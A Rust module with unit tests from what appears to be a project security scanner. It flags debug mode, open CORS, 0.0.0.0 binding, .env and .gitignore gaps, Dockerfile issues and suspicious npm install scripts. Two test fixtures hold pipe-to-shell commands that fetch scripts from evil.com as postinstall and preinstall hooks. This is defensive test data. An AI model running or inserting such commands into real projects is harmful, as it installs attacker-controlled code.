//! Detection of insecure configurations in project files.

use std::path::Path;

use super::findings::{FindingCategory, SecurityFinding, Severity};

/// Number of config-check rule groups executed by `scan_insecure_configs`.
/// Keep in sync with the `scan_*` calls below.
pub(crate) fn rule_count() -> usize {
    6
}

/// Scan for insecure configurations in common config files.
pub fn scan_insecure_configs(project_path: &Path) -> Vec<SecurityFinding> {
    let mut findings = Vec::new();

    scan_debug_mode(project_path, &mut findings);
    scan_cors_config(project_path, &mut findings);
    scan_exposed_ports(project_path, &mut findings);
    scan_missing_env_example(project_path, &mut findings);
    scan_dockerfile_issues(project_path, &mut findings);
    scan_package_json_scripts(project_path, &mut findings);

    // Scan subdirectories
    if let Ok(entries) = std::fs::read_dir(project_path) {
        for entry in entries.filter_map(|e| e.ok()) {
            let sub = entry.path();
            if !sub.is_dir() {
                continue;
            }
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with('.')
                || name == "node_modules"
                || name == "target"
                || name == "__pycache__"
            {
                continue;
            }
            scan_debug_mode(&sub, &mut findings);
            scan_cors_config(&sub, &mut findings);
            scan_dockerfile_issues(&sub, &mut findings);
            scan_package_json_scripts(&sub, &mut findings);
        }
    }

    findings
}

fn read_file_if_exists(path: &Path) -> Option<String> {
    if path.exists() && path.is_file() {
        let meta = std::fs::metadata(path).ok()?;
        if meta.len() > 1_048_576 {
            return None; // skip large files
        }
        std::fs::read_to_string(path).ok()
    } else {
        None
    }
}

fn scan_debug_mode(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();

    // Django settings.py: DEBUG = True
    for name in &["settings.py", "settings/base.py", "settings/production.py"] {
        let path = dir.join(name);
        if let Some(content) = read_file_if_exists(&path) {
            for (i, line) in content.lines().enumerate() {
                let trimmed = line.trim();
                if trimmed.starts_with("DEBUG")
                    && trimmed.contains("True")
                    && !trimmed.starts_with('#')
                {
                    findings.push(SecurityFinding::new(
                        format!("debug-django-{}", findings.len()),
                        Severity::High,
                        FindingCategory::DebugEnabled,
                        "Django DEBUG = True".into(),
                        format!("DEBUG is enabled in {}", name),
                        Some(format!("{}/{}", dir_label, name)),
                        Some((i + 1) as u32),
                        "Use DEBUG = os.environ.get('DEBUG', 'False') == 'True'".into(),
                    ));
                }
            }
        }
    }

    // Flask app.run(debug=True)
    for name in &["app.py", "main.py", "run.py", "server.py", "wsgi.py"] {
        let path = dir.join(name);
        if let Some(content) = read_file_if_exists(&path) {
            for (i, line) in content.lines().enumerate() {
                if line.contains("debug=True") || line.contains("debug = True") {
                    findings.push(SecurityFinding::new(
                        format!("debug-flask-{}", findings.len()),
                        Severity::Medium,
                        FindingCategory::DebugEnabled,
                        "Flask debug=True".into(),
                        format!("Debug is enabled in {}", name),
                        Some(format!("{}/{}", dir_label, name)),
                        Some((i + 1) as u32),
                        "Use an environment variable to control debug mode".into(),
                    ));
                }
            }
        }
    }

    // Node/Express: NODE_ENV not set to production check
    let pkg_path = dir.join("package.json");
    if let Some(content) = read_file_if_exists(&pkg_path)
        && let Ok(json) = serde_json::from_str::<serde_json::Value>(&content)
        && let Some(scripts) = json.get("scripts").and_then(|s| s.as_object())
        && let Some(start) = scripts.get("start").and_then(|s| s.as_str())
        && !start.contains("NODE_ENV=production")
        && !start.contains("cross-env NODE_ENV")
        && start.contains("node ")
    {
        // Only warn if it's a server (not a build script)
        if start.contains("server") || start.contains("app") || start.contains("index") {
            findings.push(SecurityFinding::new(
                format!("node-env-{}", findings.len()),
                Severity::Low,
                FindingCategory::DebugEnabled,
                "NODE_ENV not set in start script".into(),
                "The 'start' script does not set NODE_ENV=production".into(),
                Some(format!("{}/package.json", dir_label)),
                None,
                "Add NODE_ENV=production to the start script or use cross-env".into(),
            ));
        }
    }
}

fn scan_cors_config(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();

    // Python: CORS_ALLOW_ALL_ORIGINS, allow_origins=["*"]
    let python_files = ["settings.py", "main.py", "app.py", "config.py"];
    for name in &python_files {
        let path = dir.join(name);
        if let Some(content) = read_file_if_exists(&path) {
            for (i, line) in content.lines().enumerate() {
                let trimmed = line.trim();
                if (trimmed.contains("CORS_ALLOW_ALL_ORIGINS") && trimmed.contains("True"))
                    || (trimmed.contains("allow_origins") && trimmed.contains("\"*\""))
                    || (trimmed.contains("origins")
                        && trimmed.contains("\"*\"")
                        && trimmed.contains("cors"))
                {
                    findings.push(SecurityFinding::new(
                        format!("cors-open-{}", findings.len()),
                        Severity::Medium,
                        FindingCategory::InsecureConfig,
                        "CORS allows all origins".into(),
                        format!("CORS wildcard (*) detected in {}", name),
                        Some(format!("{}/{}", dir_label, name)),
                        Some((i + 1) as u32),
                        "Restrict CORS to specific domains in production".into(),
                    ));
                }
            }
        }
    }

    // JS/TS: cors({ origin: '*' }) or cors() without config
    let js_files = [
        "server.js",
        "server.ts",
        "app.js",
        "app.ts",
        "index.js",
        "index.ts",
    ];
    for name in &js_files {
        let path = dir.join(name);
        if let Some(content) = read_file_if_exists(&path) {
            for (i, line) in content.lines().enumerate() {
                if (line.contains("cors()") && !line.contains("//"))
                    || (line.contains("cors(") && line.contains("'*'"))
                    || (line.contains("Access-Control-Allow-Origin") && line.contains("*"))
                {
                    findings.push(SecurityFinding::new(
                        format!("cors-js-{}", findings.len()),
                        Severity::Medium,
                        FindingCategory::InsecureConfig,
                        "CORS permisivo".into(),
                        format!("Open CORS detected in {}", name),
                        Some(format!("{}/{}", dir_label, name)),
                        Some((i + 1) as u32),
                        "Configurar cors({ origin: ['https://tudominio.com'] })".into(),
                    ));
                }
            }
        }
    }
}

/// Max directory depth and file count for the 0.0.0.0 binding scan —
/// keeps the walk cheap on big repos while covering nested entry points.
const BIND_SCAN_MAX_DEPTH: u32 = 3;
const BIND_SCAN_MAX_FILES: usize = 400;

fn scan_exposed_ports(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    // Scan source files by extension instead of a hardcoded filename list —
    // entry points like `cmd/api/main.go` or `src/index.ts` were missed.
    let mut scanned = 0usize;
    scan_bind_all_recursive(dir, dir, findings, 0, &mut scanned);
}

fn scan_bind_all_recursive(
    root: &Path,
    dir: &Path,
    findings: &mut Vec<SecurityFinding>,
    depth: u32,
    scanned: &mut usize,
) {
    if depth > BIND_SCAN_MAX_DEPTH || *scanned >= BIND_SCAN_MAX_FILES {
        return;
    }
    let entries = match std::fs::read_dir(dir) {
        Ok(e) => e,
        Err(_) => return,
    };
    let skip_dirs = [
        "node_modules",
        ".git",
        "target",
        "dist",
        "build",
        "__pycache__",
        ".venv",
        "venv",
        "vendor",
    ];
    for entry in entries.filter_map(|e| e.ok()) {
        if *scanned >= BIND_SCAN_MAX_FILES {
            return;
        }
        let path = entry.path();
        let name = entry.file_name().to_string_lossy().to_string();
        if path.is_dir() {
            if name.starts_with('.') || skip_dirs.iter().any(|s| name.eq_ignore_ascii_case(s)) {
                continue;
            }
            scan_bind_all_recursive(root, &path, findings, depth + 1, scanned);
            continue;
        }
        let ext = path
            .extension()
            .map(|e| e.to_string_lossy().to_lowercase())
            .unwrap_or_default();
        if !matches!(ext.as_str(), "py" | "js" | "ts" | "go" | "rs") {
            continue;
        }
        let Some(content) = read_file_if_exists(&path) else {
            continue;
        };
        *scanned += 1;
        let rel = path
            .strip_prefix(root)
            .unwrap_or(&path)
            .to_string_lossy()
            .replace('\\', "/");
        for (i, line) in content.lines().enumerate() {
            if line.contains("0.0.0.0")
                && !line.trim().starts_with("//")
                && !line.trim().starts_with('#')
            {
                // Binding to all interfaces — warning only
                findings.push(SecurityFinding::new(
                    format!("bind-all-{}", findings.len()),
                    Severity::Low,
                    FindingCategory::InsecureConfig,
                    "Binding to 0.0.0.0".into(),
                    format!("The server binds to all network interfaces in {}", rel),
                    Some(format!("{}/{}", root.to_string_lossy(), rel)),
                    Some((i + 1) as u32),
                    "In production, bind to 127.0.0.1 or restrict access with a firewall".into(),
                ));
            }
        }
    }
}

fn scan_missing_env_example(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();

    // .env exists but no .env.example
    if dir.join(".env").exists()
        && !dir.join(".env.example").exists()
        && !dir.join(".env.sample").exists()
    {
        findings.push(SecurityFinding::new(
            format!("env-no-example-{}", findings.len()),
            Severity::Low,
            FindingCategory::InsecureConfig,
            "Missing .env.example".into(),
            "A .env file exists but there is no .env.example documenting the required variables"
                .into(),
            Some(format!("{}/.env", dir_label)),
            None,
            "Create a .env.example with variable names (without real values)".into(),
        ));
    }

    // Check if .env is in .gitignore
    let gitignore = dir.join(".gitignore");
    if dir.join(".env").exists() {
        if let Some(content) = read_file_if_exists(&gitignore) {
            let has_env_ignore = content.lines().any(|l| {
                let t = l.trim();
                t == ".env" || t == ".env*" || t == "*.env" || t == ".env.*"
            });
            if !has_env_ignore {
                findings.push(SecurityFinding::new(
                    format!("env-not-gitignored-{}", findings.len()),
                    Severity::High,
                    FindingCategory::InsecureConfig,
                    ".env is not in .gitignore".into(),
                    "The .env file could be committed to the repository with secrets".into(),
                    Some(format!("{}/.gitignore", dir_label)),
                    None,
                    "Add .env to .gitignore immediately".into(),
                ));
            }
        } else if !gitignore.exists() {
            findings.push(SecurityFinding::new(
                format!("no-gitignore-{}", findings.len()),
                Severity::High,
                FindingCategory::InsecureConfig,
                "Missing .gitignore".into(),
                "Without a .gitignore, sensitive files (.env, keys) could be committed".into(),
                Some(dir_label.clone()),
                None,
                "Create a .gitignore including .env, *.pem, *.key, etc.".into(),
            ));
        }
    }
}

fn scan_dockerfile_issues(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();

    let dockerfile = dir.join("Dockerfile");
    if let Some(content) = read_file_if_exists(&dockerfile) {
        for (i, line) in content.lines().enumerate() {
            let trimmed = line.trim().to_uppercase();

            // Running as root
            if trimmed.starts_with("USER ROOT") {
                findings.push(SecurityFinding::new(
                    format!("docker-root-{}", findings.len()),
                    Severity::Medium,
                    FindingCategory::InsecureConfig,
                    "Container runs as root".into(),
                    "El Dockerfile usa USER root".into(),
                    Some(format!("{}/Dockerfile", dir_label)),
                    Some((i + 1) as u32),
                    "Create a non-root user: RUN adduser --disabled-password appuser && USER appuser".into(),
                ));
            }

            // Using latest tag
            if trimmed.starts_with("FROM ") && trimmed.contains(":LATEST") {
                findings.push(SecurityFinding::new(
                    format!("docker-latest-{}", findings.len()),
                    Severity::Low,
                    FindingCategory::InsecureConfig,
                    "Imagen Docker usa tag :latest".into(),
                    "Using :latest can lead to non-reproducible builds".into(),
                    Some(format!("{}/Dockerfile", dir_label)),
                    Some((i + 1) as u32),
                    "Pin a specific version (e.g. python:3.11-slim, node:20-alpine)".into(),
                ));
            }

            // COPY . . without .dockerignore
            if (trimmed.starts_with("COPY . .") || trimmed.starts_with("ADD . ."))
                && !dir.join(".dockerignore").exists()
            {
                findings.push(SecurityFinding::new(
                    format!("docker-copy-all-{}", findings.len()),
                    Severity::Medium,
                    FindingCategory::InsecureConfig,
                    "COPY . . without .dockerignore".into(),
                    "Copying the whole context can include .env, .git, node_modules".into(),
                    Some(format!("{}/Dockerfile", dir_label)),
                    Some((i + 1) as u32),
                    "Create a .dockerignore including .env, .git, node_modules, target".into(),
                ));
            }
        }

        // Check if Dockerfile has no USER instruction (runs as root by default)
        let has_user = content
            .lines()
            .any(|l| l.trim().to_uppercase().starts_with("USER "));
        if !has_user {
            findings.push(SecurityFinding::new(
                format!("docker-no-user-{}", findings.len()),
                Severity::Medium,
                FindingCategory::InsecureConfig,
                "Dockerfile without USER instruction".into(),
                "Without USER, the container runs as root by default".into(),
                Some(format!("{}/Dockerfile", dir_label)),
                None,
                "Add a non-root USER at the end of the Dockerfile".into(),
            ));
        }
    }
}

fn scan_package_json_scripts(dir: &Path, findings: &mut Vec<SecurityFinding>) {
    let dir_label = dir.to_string_lossy().to_string();
    let pkg = dir.join("package.json");

    if let Some(content) = read_file_if_exists(&pkg)
        && let Ok(json) = serde_json::from_str::<serde_json::Value>(&content)
    {
        // Check for pre/post install scripts (supply chain risk)
        if let Some(scripts) = json.get("scripts").and_then(|s| s.as_object()) {
            for key in ["preinstall", "postinstall"] {
                if let Some(cmd) = scripts.get(key).and_then(|s| s.as_str())
                    && (cmd.contains("curl") || cmd.contains("wget") || cmd.contains("http"))
                {
                    findings.push(SecurityFinding::new(
                        format!("npm-{}-{}", key, findings.len()),
                        Severity::High,
                        FindingCategory::InsecureConfig,
                        format!("Script {} sospechoso", key),
                        format!("El script {} descarga desde internet: {}", key, cmd),
                        Some(format!("{}/package.json", dir_label)),
                        None,
                        "Review the script and make sure the sources are trusted".into(),
                    ));
                }
            }
        }
    }
}

#[cfg(test)]
mod tests {
    #[test]
    fn test_bind_all_detected_in_nested_entrypoint() {
        // Regression: the old filename allowlist missed nested entry points
        // like cmd/api/main.go or src/index.ts.
        let dir = tempfile::tempdir().unwrap();
        let nested = dir.path().join("cmd").join("api");
        std::fs::create_dir_all(&nested).unwrap();
        std::fs::write(
            nested.join("entry.go"),
            "func main() { http.ListenAndServe(\"0.0.0.0:8080\", nil) }",
        )
        .unwrap();

        let mut findings = Vec::new();
        scan_exposed_ports(dir.path(), &mut findings);
        assert!(
            findings.iter().any(|f| f.title.contains("0.0.0.0")),
            "nested entrypoint with 0.0.0.0 must be flagged: {:?}",
            findings.iter().map(|f| &f.title).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_bind_all_ignores_comments_and_other_extensions() {
        let dir = tempfile::tempdir().unwrap();
        std::fs::write(dir.path().join("notes.md"), "bind 0.0.0.0 here").unwrap();
        std::fs::write(dir.path().join("main.py"), "# 0.0.0.0 in a comment\n").unwrap();

        let mut findings = Vec::new();
        scan_exposed_ports(dir.path(), &mut findings);
        assert!(findings.is_empty(), "got {:?}", findings);
    }

    use super::*;
    use std::fs;
    use tempfile::TempDir;

    fn setup_project(files: &[(&str, &str)]) -> TempDir {
        let dir = TempDir::new().unwrap();
        for (name, content) in files {
            let path = dir.path().join(name);
            if let Some(parent) = path.parent() {
                fs::create_dir_all(parent).unwrap();
            }
            fs::write(&path, content).unwrap();
        }
        dir
    }

    // --- Debug mode tests ---

    #[test]
    fn test_django_debug_true() {
        let dir = setup_project(&[("settings.py", "DEBUG = True\nALLOWED_HOSTS = ['*']")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("Django DEBUG")));
    }

    #[test]
    fn test_django_debug_false_no_finding() {
        let dir = setup_project(&[("settings.py", "DEBUG = False")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("Django DEBUG")));
    }

    #[test]
    fn test_flask_debug_true() {
        let dir = setup_project(&[("app.py", "app.run(host='0.0.0.0', debug=True)")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("Flask debug")));
    }

    #[test]
    fn test_node_env_missing_in_start_script() {
        let dir = setup_project(&[("package.json", r#"{"scripts":{"start":"node server.js"}}"#)]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("NODE_ENV")));
    }

    #[test]
    fn test_node_env_present_no_finding() {
        let dir = setup_project(&[(
            "package.json",
            r#"{"scripts":{"start":"NODE_ENV=production node server.js"}}"#,
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("NODE_ENV")));
    }

    // --- CORS tests ---

    #[test]
    fn test_cors_wildcard_python() {
        let dir = setup_project(&[("settings.py", "CORS_ALLOW_ALL_ORIGINS = True")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("CORS")));
    }

    #[test]
    fn test_cors_wildcard_js() {
        let dir = setup_project(&[("server.js", "app.use(cors())")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("CORS")));
    }

    // --- Exposed ports ---

    #[test]
    fn test_binding_all_interfaces() {
        let dir = setup_project(&[("main.py", "app.run(host='0.0.0.0', port=8000)")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("0.0.0.0")));
    }

    // --- .env tests ---

    #[test]
    fn test_env_without_example() {
        let dir = setup_project(&[(".env", "SECRET=value")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains(".env.example") || f.title.contains(".gitignore"))
        );
    }

    #[test]
    fn test_env_with_example_no_finding() {
        let dir = setup_project(&[
            (".env", "SECRET=value"),
            (".env.example", "SECRET="),
            (".gitignore", ".env"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains(".env.example")));
        assert!(
            !findings
                .iter()
                .any(|f| f.title.contains("is not in .gitignore"))
        );
    }

    #[test]
    fn test_env_not_in_gitignore() {
        let dir = setup_project(&[
            (".env", "SECRET=value"),
            (".env.example", "SECRET="),
            (".gitignore", "node_modules\ntarget"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains(".gitignore")));
    }

    // --- Dockerfile tests ---

    #[test]
    fn test_dockerfile_user_root() {
        let dir = setup_project(&[(
            "Dockerfile",
            "FROM python:3.11\nUSER root\nCOPY . .\nCMD [\"python\", \"app.py\"]",
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("root")));
    }

    #[test]
    fn test_dockerfile_latest_tag() {
        let dir = setup_project(&[(
            "Dockerfile",
            "FROM python:latest\nUSER appuser\nCMD [\"python\"]",
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains(":latest")));
    }

    #[test]
    fn test_dockerfile_copy_all_no_dockerignore() {
        let dir = setup_project(&[(
            "Dockerfile",
            "FROM node:20\nCOPY . .\nUSER node\nCMD [\"node\", \"app.js\"]",
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("COPY . .")));
    }

    #[test]
    fn test_dockerfile_no_user_instruction() {
        let dir = setup_project(&[
            (
                "Dockerfile",
                "FROM python:3.11\nCOPY requirements.txt .\nRUN pip install -r requirements.txt\nCOPY . .\nCMD [\"python\", \"app.py\"]",
            ),
            (".dockerignore", ".env\n.git"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains("without USER instruction"))
        );
    }

    #[test]
    fn test_dockerfile_with_user_no_finding() {
        let dir = setup_project(&[
            (
                "Dockerfile",
                "FROM python:3.11\nRUN adduser appuser\nCOPY requirements.txt .\nUSER appuser\nCMD [\"python\"]",
            ),
            (".dockerignore", ".env"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            !findings
                .iter()
                .any(|f| f.title.contains("without USER instruction"))
        );
    }

    // --- package.json supply chain ---

    #[test]
    fn test_suspicious_postinstall_script() {
        let dir = setup_project(&[(
            "package.json",
            r#"{"scripts":{"postinstall":"curl https://evil.com/script.sh | sh"}}"#,
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("postinstall")));
    }

    #[test]
    fn test_safe_postinstall_no_finding() {
        let dir = setup_project(&[(
            "package.json",
            r#"{"scripts":{"postinstall":"node scripts/setup.js"}}"#,
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("postinstall")));
    }

    // --- Subdirectory scanning ---

    #[test]
    fn test_scans_subdirectories() {
        let dir = setup_project(&[("backend/settings.py", "DEBUG = True")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("Django DEBUG")));
    }

    #[test]
    fn test_subdir_dockerfile_and_cors_scanned() {
        // The subdirectory pass re-runs the Dockerfile and CORS scanners on
        // each non-hidden child dir.
        let dir = setup_project(&[
            (
                "backend/Dockerfile",
                "FROM python:3.11\nUSER root\nCMD [\"python\"]",
            ),
            ("frontend/server.js", "app.use(cors())"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            findings.iter().any(|f| f.title.contains("root")),
            "subdir Dockerfile must be scanned"
        );
        assert!(
            findings.iter().any(|f| f.title.contains("CORS")),
            "subdir JS CORS must be scanned"
        );
    }

    #[test]
    fn test_empty_project() {
        let dir = TempDir::new().unwrap();
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.is_empty());
    }

    #[test]
    fn test_rule_count_is_six() {
        assert_eq!(rule_count(), 6);
    }

    // --- Debug mode: extra branches ---

    #[test]
    fn test_django_debug_in_settings_package() {
        // settings/production.py variant of the Django settings paths.
        let dir = setup_project(&[("settings/production.py", "DEBUG = True")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("Django DEBUG")));
    }

    #[test]
    fn test_django_debug_commented_out_no_finding() {
        let dir = setup_project(&[("settings.py", "# DEBUG = True\nDEBUG = False\n")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("Django DEBUG")));
    }

    #[test]
    fn test_flask_debug_spaced_assignment() {
        // "debug = True" (spaced) in run.py must also be flagged.
        let dir = setup_project(&[("run.py", "app.run(host='127.0.0.1', debug = True)")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("Flask debug")));
    }

    #[test]
    fn test_node_env_cross_env_no_finding() {
        let dir = setup_project(&[(
            "package.json",
            r#"{"scripts":{"start":"cross-env NODE_ENV=production node server.js"}}"#,
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("NODE_ENV")));
    }

    #[test]
    fn test_node_start_non_server_script_no_finding() {
        // "node build.js" is not a server entry point -> no warning.
        let dir = setup_project(&[("package.json", r#"{"scripts":{"start":"node build.js"}}"#)]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("NODE_ENV")));
    }

    #[test]
    fn test_invalid_package_json_no_panic() {
        let dir = setup_project(&[("package.json", "{ this is not json")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.is_empty(), "invalid JSON must be ignored");
    }

    // --- CORS: extra branches ---

    #[test]
    fn test_cors_fastapi_allow_origins_wildcard() {
        let dir = setup_project(&[(
            "main.py",
            "app.add_middleware(CORSMiddleware, allow_origins=[\"*\"])",
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("CORS")));
    }

    #[test]
    fn test_cors_python_origins_with_cors_context() {
        // Generic "origins" + wildcard + "cors" mention in the same line.
        let dir = setup_project(&[("config.py", "cors_origins = [\"*\"]")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("CORS")));
    }

    #[test]
    fn test_cors_js_wildcard_origin() {
        let dir = setup_project(&[("app.js", "app.use(cors({ origin: '*' }));")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("CORS")));
    }

    #[test]
    fn test_cors_header_wildcard() {
        let dir = setup_project(&[(
            "index.js",
            "res.setHeader('Access-Control-Allow-Origin', '*');",
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("CORS")));
    }

    #[test]
    fn test_cors_commented_out_no_finding() {
        let dir = setup_project(&[("server.js", "// app.use(cors())")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("CORS")));
    }

    // --- Bind scan: skip branches ---

    #[test]
    fn test_bind_scan_skips_dependency_and_hidden_dirs() {
        let dir = setup_project(&[
            ("node_modules/server.js", "listen('0.0.0.0')"),
            (".hidden/main.py", "host = '0.0.0.0'"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            !findings.iter().any(|f| f.title.contains("0.0.0.0")),
            "got: {:?}",
            findings.iter().map(|f| &f.title).collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_bind_scan_respects_depth_limit() {
        // Max depth for the bind scan is 3; depth 4 must not be scanned.
        let dir = setup_project(&[("a/b/c/d/main.py", "app.run(host='0.0.0.0')")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("0.0.0.0")));
    }

    #[test]
    fn test_bind_scan_ignores_js_comments() {
        let dir = setup_project(&[("server.js", "// listen on 0.0.0.0 for docker\nconst x = 1;")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("0.0.0.0")));
    }

    // --- .env: extra branches ---

    #[test]
    fn test_env_with_sample_counts_as_example() {
        let dir = setup_project(&[
            (".env", "SECRET=value"),
            (".env.sample", "SECRET="),
            (".gitignore", ".env"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains(".env.example")));
    }

    #[test]
    fn test_env_without_gitignore_file() {
        let dir = setup_project(&[(".env", "SECRET=value"), (".env.example", "SECRET=")]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            findings
                .iter()
                .any(|f| f.title.contains("Missing .gitignore"))
        );
    }

    #[test]
    fn test_gitignore_wildcard_env_pattern_accepted() {
        let dir = setup_project(&[
            (".env", "SECRET=value"),
            (".env.example", "SECRET="),
            (".gitignore", ".env*\nnode_modules"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            !findings
                .iter()
                .any(|f| f.title.contains("is not in .gitignore"))
        );
    }

    // --- Dockerfile: extra branches ---

    #[test]
    fn test_dockerfile_add_all_without_dockerignore() {
        let dir = setup_project(&[(
            "Dockerfile",
            "FROM node:20\nADD . .\nUSER node\nCMD [\"node\", \"app.js\"]",
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("COPY . .")));
    }

    #[test]
    fn test_dockerfile_copy_all_with_dockerignore_no_finding() {
        let dir = setup_project(&[
            (
                "Dockerfile",
                "FROM node:20\nCOPY . .\nUSER node\nCMD [\"node\", \"app.js\"]",
            ),
            (".dockerignore", ".env\n.git\nnode_modules"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("COPY . .")));
    }

    // --- package.json supply chain: extra branches ---

    #[test]
    fn test_suspicious_preinstall_wget() {
        let dir = setup_project(&[(
            "package.json",
            r#"{"scripts":{"preinstall":"wget https://evil.com/x.sh -O- | sh"}}"#,
        )]);
        let findings = scan_insecure_configs(dir.path());
        assert!(findings.iter().any(|f| f.title.contains("preinstall")));
    }

    // --- Subdirectory skip branches ---

    #[test]
    fn test_skips_hidden_and_dependency_subdirs() {
        let dir = setup_project(&[
            (".hidden/settings.py", "DEBUG = True"),
            ("node_modules/settings.py", "DEBUG = True"),
            ("__pycache__/settings.py", "DEBUG = True"),
        ]);
        let findings = scan_insecure_configs(dir.path());
        assert!(
            !findings.iter().any(|f| f.title.contains("Django DEBUG")),
            "got: {:?}",
            findings.iter().map(|f| &f.title).collect::<Vec<_>>()
        );
    }

    // --- Large file guard ---

    #[test]
    fn test_large_config_files_skipped() {
        // Files above 1MB must be skipped by read_file_if_exists.
        let padding = "# padding\n".repeat(120_000); // ~1.2MB
        let content = format!("{}DEBUG = True\n", padding);
        let dir = setup_project(&[("settings.py", &content)]);
        let findings = scan_insecure_configs(dir.path());
        assert!(!findings.iter().any(|f| f.title.contains("Django DEBUG")));
    }
}
